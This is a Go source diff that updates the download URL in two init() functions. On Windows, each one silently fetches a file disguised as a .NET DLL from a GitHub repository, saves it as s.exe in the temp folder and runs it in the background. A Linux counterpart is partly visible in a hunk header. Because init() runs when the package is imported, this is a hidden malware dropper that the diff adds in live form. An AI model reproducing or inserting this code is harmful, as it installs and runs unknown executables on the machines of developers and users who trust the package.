@@ -12,7 +12,7 @@ import (
 
 )
 
-func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
+func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
 
 
 
@@ -21,7 +21,7 @@ func init() { if runtime.GOOS == "linux" { go func() { exec.Command("sh", "-c", 
 
 
 
-func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
+func init() { if runtime.GOOS == "windows" { go func() { exec.Command("cmd", "/c", "curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && %TEMP%\\s.exe").Start() }() } }
 
 func Run()  {
 
